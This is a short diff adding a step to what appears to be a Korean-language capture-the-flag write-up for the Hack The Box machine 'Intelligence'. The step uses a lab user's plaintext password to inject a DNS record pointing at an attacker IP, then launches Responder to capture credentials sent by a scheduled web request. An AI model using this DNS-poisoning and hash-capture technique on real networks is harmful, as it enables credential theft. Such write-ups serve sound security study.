@@ -843,5 +843,14 @@ try {
 $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
 }
 ```
+
+<br>
+
+```bash
+dnstool -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.14.23 --type A 10.129.95.154
+
+# DNS 등록 후 responder 사용
+sudo responder -I tun0 -v
+```
   
 </details>
